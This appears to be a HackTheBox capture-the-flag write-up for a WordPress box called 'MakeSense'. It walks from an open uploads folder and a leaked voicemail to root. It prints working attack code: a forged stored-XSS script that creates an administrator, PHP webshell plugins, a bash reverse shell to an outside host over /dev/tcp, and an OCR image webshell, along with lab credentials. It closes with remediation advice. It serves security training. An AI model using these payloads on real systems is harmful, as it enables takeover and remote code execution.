---
title: "MakeSense — From a Public Uploads Folder to Root"
date: 2026-11-15
platform: htb
slug: makesense
os: Linux
difficulty: Medium
target: makesense.htb
ip: 10.129.246.24
read_time: "~12 min read"
tags: [wordpress, stored-xss, rce, privesc]
excerpt_text: "An open uploads folder leaks a voicemail with creds; a hardcoded client-side AES key lets me forge a stored-XSS payload into admin, then plugin RCE, credential reuse, and an OCR image-webshell to root."
description: "HackTheBox MakeSense walkthrough — open uploads folder, leaked voicemail, hardcoded AES key, forged stored XSS to admin, plugin RCE, credential reuse, and an OCR image webshell to root."
---

Most WordPress boxes fall to a plugin CVE. MakeSense doesn’t — it hands you the keys itself. A voicemail left in a public folder, an “AI voice assistant” that ships its own encryption key straight to the browser, and a chain of trust that collapses the moment you read the client-side JavaScript. This is the full path from an anonymous port scan to a root shell, and why every step was a decision, not a guess.

> **Lab / authorized target.** Everything below was performed against a HackTheBox machine I was explicitly authorized to test. Target: makesense.htb (10.129.246.24).

**Attack path at a glance**

```text
nmap → WordPress enum (wpscan) → open uploads dir (voicemail → jake)
  → source review (hardcoded AES key) → forged payload = stored XSS
  → admin CSRF (new admin) → malicious plugin = RCE (www-data)
  → wp-config creds reuse (walter → SSH → user.txt)
  → internal OCR service → image webshell → ROOT
```

## Methodology

I follow a fixed order so nothing gets skipped and no step is based on a guess:

1. **Reconnaissance** — map every open port and service.
2. **Enumeration** — dig into each service; start with the largest attack surface.
3. **Fingerprinting** — identify the exact product and version before touching any exploit.
4. **Gaining Access** — get the first foothold.
5. **Lateral Movement & Proof** — reuse what the box leaks to become a real user.
6. **Privilege Escalation** — turn a local service into root.

## 1. Reconnaissance

Start by discovering what's actually running on the host:

```bash
nmap -Pn -sV -sC 10.129.246.24
```

SSH (22) and HTTP/HTTPS are open, and the web server redirects to a hostname. Add it to the hosts file so name-based routing works:
<img width="720" height="418" alt="image" src="https://github.com/user-attachments/assets/e4386701-e84b-4646-8041-223489142114" />


```bash
echo "10.129.196.131 makesense.htb" | sudo tee -a /etc/hosts
```

<img width="558" height="83" alt="image" src="https://github.com/user-attachments/assets/50e1d314-777f-4898-9566-2448e1965371" />


## 2. Enumeration

### 2.1 Web — the priority

Directory brute force first:

```bash
feroxbuster -k -u https://makesense.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The results are a textbook WordPress layout — `wp-content`, `wp-admin`, `wp-includes`, `xmlrpc.php` — plus a custom `webagency` theme. The host is no longer an anonymous server; it's a known application, and every step after this is targeted.

<img width="720" height="589" alt="image" src="https://github.com/user-attachments/assets/6c30af88-84f1-4253-a953-097980962609" />

<img width="720" height="889" alt="image" src="https://github.com/user-attachments/assets/a1e114ed-68c5-4a9b-92fe-8988e48fef4e" />


### 2.2 Fingerprinting — never skip this

Before choosing any angle, confirm exactly what WordPress is running:

```bash
wpscan --url https://makesense.htb --disable-tls-checks -v
```

<img width="720" height="379" alt="image" src="https://github.com/user-attachments/assets/667348fc-fd8d-49f0-8adf-232b8c217f84" />


Key findings:

- WordPress 7.0
- Theme in use: `webagency`
- XML-RPC enabled (`/xmlrpc.php`)
- Upload directory listing enabled at `/wp-content/uploads/`

That last line is the opening — a misconfiguration, not a CVE.

<img width="720" height="847" alt="image" src="https://github.com/user-attachments/assets/c39baead-6ff2-4761-b766-49fc80db3565" />

<img width="720" height="429" alt="image" src="https://github.com/user-attachments/assets/733b05ed-0edc-4efe-9fe4-56e7f3e4b05c" />


### 2.3 User enumeration

The REST API happily lists users:

```bash
curl -k -s "https://makesense.htb/index.php?rest_route=/wp/v2/users" | jq
```

We get `admin`, whose `url` field points to `http://localhost:8000` — a hint that something is bound locally that we'll care about later. XML-RPC also answers `system.listMethods`, confirming the pingback and `wp.*`/`metaWeblog.*` method set is live — worth noting, but the real lead is the open uploads folder.

<img width="720" height="359" alt="image" src="https://github.com/user-attachments/assets/819a5fd5-7f06-4449-84d1-43a74a81c4e8" />


## 3. Gaining Access

### 3.1 The exposed voice message

Because upload listing is enabled, I just browse the uploads folder by month:

```bash
for m in 01 05 06 07 11; do
  echo "=== /wp-content/uploads/2026/$m/ ==="
  curl -k -s "https://makesense.htb/wp-content/uploads/2026/$m/" \
    | grep -oE 'href="[^"?]+"' | grep -vE '/(icons|parent|uploads)'
done
```

<img width="646" height="205" alt="image" src="https://github.com/user-attachments/assets/531915a4-0a62-4544-93c3-cf9bf7e383d7" />


Under `/wp-content/uploads/2026/` there's a `voice-message.wav`. Download it and listen — the recording reads out a set of credentials:

```text
jake : ClearLightNiceSmooth4923
```

Those log straight into `wp-admin`.

<img width="657" height="414" alt="image" src="https://github.com/user-attachments/assets/a9216a22-ad53-4e88-b212-2bc423e7ba6b" />

<img width="596" height="333" alt="image" src="https://github.com/user-attachments/assets/6bcd9ce5-21e0-4558-8737-f99c4690352b" />



### 3.2 Reading the theme source — the real vulnerability

Logged in as jake, the interesting feature is the theme's voice assistant. Pull the JavaScript:

```bash
curl -k https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

Two things jump out. First, a hardcoded symmetric key:

```js
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The client transcribes your voice, summarizes it, then AES-GCM encrypts a `{ transcription, summary }` payload with a key derived from this string (SHA-256) and POSTs it to `admin-ajax.php` with `action=save_voice_results`. Because the key lives in the client, we can encrypt anything we want and the server will accept it as genuine.

Second, a "spoken symbols" mapping:

```js
applySymbolMapping(text) {
  const mappings = {
    'open bracket': '<',
    'close bracket': '>',
    'slash': '/',
    'quote': "'",
    // ...
  };
}
```

The transcript is post-processed so spoken words become symbols — "open bracket script close bracket" becomes `<script>`. The feature is literally designed to turn dictated text into HTML, and the stored result is later rendered in the admin panel. That is stored XSS by design — and with the encryption key in hand, we don't even need to speak it.

### 3.3 Forging the payload → stored XSS → admin CSRF

The plan: forge an encrypted `save_voice_results` payload whose "summary" is a `<script>` that runs in the admin's session when they review the submission. The script grabs the create-user nonce and adds a new administrator.

First get a valid `post_id` and a nonce:

```bash
NONCE=$(curl -k -s https://makesense.htb/ | grep -oP 'nonce":"\K[a-f0-9]+' | head -1)
RESP=$(curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -d "action=submit_contact_form" -d "nonce=$NONCE" \
  -d "name=test" -d "email=t@t.com" -d "phone=1" -d "message=csrf")
POST_ID=$(echo "$RESP" | grep -oP '"post_id":\K[0-9]+')
```

The XSS payload, carried inside the encrypted blob, creates an admin user:

```html
<script>
(async () => {
  const r = await fetch("/wp-admin/user-new.php", {credentials:"include"});
  const html = await r.text();
  const m = html.match(/name="_wpnonce_create-user" value="([^"]+)"/);
  if (!m) return;
  const fd = new FormData();
  fd.append("action","createuser");
  fd.append("_wpnonce_create-user", m[1]);
  fd.append("_wp_http_referer","/wp-admin/user-new.php");
  fd.append("user_login","pwned123");
  fd.append("email","pwned123@test.com");
  fd.append("pass1","Pwn3d!Pass2026");
  fd.append("pass2","Pwn3d!Pass2026");
  fd.append("role","administrator");
  fd.append("createuser","Add New User");
  await fetch("/wp-admin/user-new.php", {method:"POST", body: fd, credentials:"include"});
})();
</script>
```

Encrypt it with the leaked key (a short script that SHA-256s `ENCRYPTION_KEY`, AES-GCM encrypts, prepends the 12-byte IV, and base64-encodes), then submit it as the voice result:

```bash
ENC=$(python3 ~/forge_payload.py "$PAYLOAD" "csrf")
curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_results" -F "nonce=$NONCE" \
  -F "post_id=$POST_ID" -F "encrypted_payload=$ENC"
```

Keep a listener running for the callback, give the admin review bot 60–90 seconds, and the `pwned123` administrator now exists.

<img width="700" height="756" alt="image" src="https://github.com/user-attachments/assets/7ced5eb6-3c47-4262-bfd2-bba9ec08e5d3" />

<img width="720" height="715" alt="image" src="https://github.com/user-attachments/assets/00ac10d5-f6fa-4541-9921-818c1891958c" />



### 3.4 Admin → RCE via malicious plugin

Log in as the new admin and build a one-file plugin that executes commands:

<img width="720" height="396" alt="image" src="https://github.com/user-attachments/assets/985449bf-8847-4037-8171-fc0ee8f01014" />

<img width="720" height="377" alt="image" src="https://github.com/user-attachments/assets/16524aed-a0f4-4171-9249-c8f4c9898ee7" />


```php
<?php
/**
 * Plugin Name: Pwned
 * Description: pwned
 * Version: 1.0
 */
if (isset($_GET['c'])) { echo '<pre>' . shell_exec($_GET['c']) . '</pre>'; }
```


Zip it and upload through **Plugins → Add New → Upload Plugin**. (The scripted upload fought me on the nonce, so the browser UI was the path of least resistance.) Activate it, then hit the webshell:

```bash
curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="720" height="465" alt="image" src="https://github.com/user-attachments/assets/77f44c21-d86c-47d7-8b72-44489d458332" />

<img width="720" height="379" alt="image" src="https://github.com/user-attachments/assets/80c0cb34-83e1-4d2f-a2c0-fd5448a8f56f" />


A reverse shell makes it comfortable:

```bash
curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.17.244/4444%200>%261'"
```

then 

<img width="720" height="909" alt="image" src="https://github.com/user-attachments/assets/b1ef871f-dfcc-49ab-9fd2-bf82345af92a" />

I searched more until I reached this path

<img width="720" height="848" alt="image" src="https://github.com/user-attachments/assets/e5c655b9-1b81-49d8-88ea-268f22ef7306" />



## 4. Lateral Movement & Proof

Loot the WordPress config for database credentials:

```bash
grep -E 'DB_USER|DB_PASSWORD|DB_NAME' /var/www/html/wp-config.php
```

<img width="720" height="258" alt="image" src="https://github.com/user-attachments/assets/5eec2585-9072-469f-9c66-06aab4e31619" />


The DB password is reused by a real system user — check `/etc/passwd` for accounts with shells and `walter` turns up:

```text
User:     walter
Password: JbhHDAEgXvri3!
```

SSH is open and the password is reused:

```bash
ssh walter@10.129.196.131
cat /home/walter/user.txt
```

`user.txt` is done. ✅

<img width="592" height="640" alt="image" src="https://github.com/user-attachments/assets/42600cea-d434-41d9-a45d-53d63d96e9fd" />



## 5. Privilege Escalation — the OCR service

I ran parsing peas tool


<img width="720" height="496" alt="image" src="https://github.com/user-attachments/assets/10fb07a2-62b9-47ae-ad76-116ccbf9f371" />

<img width="720" height="648" alt="image" src="https://github.com/user-attachments/assets/546191b8-8777-47b8-9c8a-58ed52820398" />



As walter there's an internal service bound to localhost on port 8001. Forward it so I can reach it locally:

<img width="720" height="378" alt="image" src="https://github.com/user-attachments/assets/4fea83d1-dc8a-4fb0-88da-7f80e6c94242" />


```bash
ssh -L 8001:127.0.0.1:8001 walter@10.129.246.24
```

<img width="720" height="400" alt="image" src="https://github.com/user-attachments/assets/57f07237-0bbb-44c9-925a-3b48b8f858f5" />


It's a web app that takes a canvas image, runs OCR on it, and saves the recognized text to a file whose name you control. If I can make OCR "read" PHP source and save it as a `.php` file in the web root, that's code execution as whatever user runs the service. So I render a PHP webshell *as an image* and let OCR transcribe it back into text:

<img width="720" height="374" alt="image" src="https://github.com/user-attachments/assets/66c0341d-428c-4a1d-aa8f-e9c00510f197" />

<img width="720" height="374" alt="image" src="https://github.com/user-attachments/assets/503b71f5-5a45-4f9f-93de-76c55214fe0c" />

<img width="720" height="380" alt="image" src="https://github.com/user-attachments/assets/7e0a5b80-a75f-4191-94f3-bd69c709b798" />

<img width="720" height="398" alt="image" src="https://github.com/user-attachments/assets/4b14bd43-32a4-4aab-a216-9f196308e4dd" />


```python
from PIL import Image, ImageDraw, ImageFont

PAYLOAD = '<?php system($_GET["c"]); ?>'
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 32)

dummy = Image.new('RGB', (1, 1))
d = ImageDraw.Draw(dummy)
bb = d.textbbox((0, 0), PAYLOAD, font=font)

img = Image.new('RGB', (bb[2]-bb[0]+40, bb[3]-bb[1]+40), 'white')
draw = ImageDraw.Draw(img)
draw.text((20-bb[0], 20-bb[1]), PAYLOAD, fill='black', font=font)
img.save('/tmp/shell.png')
```

<img width="344" height="113" alt="image" src="https://github.com/user-attachments/assets/b7c3f61c-ab88-4b0f-b9e6-afb3ea03217c" />

<img width="720" height="588" alt="image" src="https://github.com/user-attachments/assets/d021ca3d-04ba-4240-bac8-82cfe6635226" />


Submit the image, grab the returned `ocr_id`, save it under a `.php` filename, and execute:

```bash
B64=$(base64 -w0 /tmp/shell.png)
AUTH=walter:JbhHDAEgXvri3!
JAR=/tmp/cookies.txt

OCR_ID=$(curl -s -c $JAR -b $JAR -u "$AUTH" -X POST http://localhost:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" \
  | grep -oP 'ocr_id" value="\K[^"]+')

curl -s -c $JAR -b $JAR -u "$AUTH" -X POST http://localhost:8001/ \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode "filename=shell.php"

curl -s -u "$AUTH" "http://localhost:8001/saved/shell.php?c=id"
```

The service runs as root, so the webshell executes as root — read `root.txt` and the box is done. 🔓

<img width="720" height="757" alt="image" src="https://github.com/user-attachments/assets/d344b439-9a65-4101-8591-ecc79af8de11" />

<img width="686" height="961" alt="image" src="https://github.com/user-attachments/assets/bb7936dc-412b-4730-99d0-4729052c16e2" />

<img width="717" height="665" alt="image" src="https://github.com/user-attachments/assets/032ba143-1b5d-4aac-97f6-b32a810bc8e1" />


## 6. Remediation

- Never expose uploads directory listing — and never store secrets (like a voicemail with credentials) where listing can reach them.
- A "symmetric encryption key (must match server-side)" in client-side JavaScript means the client is trusted; move any real validation server-side and treat all client input as hostile.
- Don't auto-render user-submitted content into an admin panel without sanitization — a feature that turns dictated words into HTML is stored XSS waiting to happen.
- Don't reuse the web app's database password for a system/SSH account.
- Don't run internal services as root, and treat "OCR writes attacker-named file" as the file-write-to-RCE primitive it is.

## 7. Key Takeaways

- **Misconfigurations beat CVEs** — an open uploads folder leaked the first credentials before any exploit was involved.
- **If a secret ships to the browser, it's not a secret** — a client-side encryption key lets an attacker forge whatever the server trusts.
- **Credential reuse is the glue** — the same password bridged web RCE to a real shell.
- **A file write in a web root is RCE** — even when it arrives dressed up as optical character recognition.

Thanks for reading — feedback welcome.
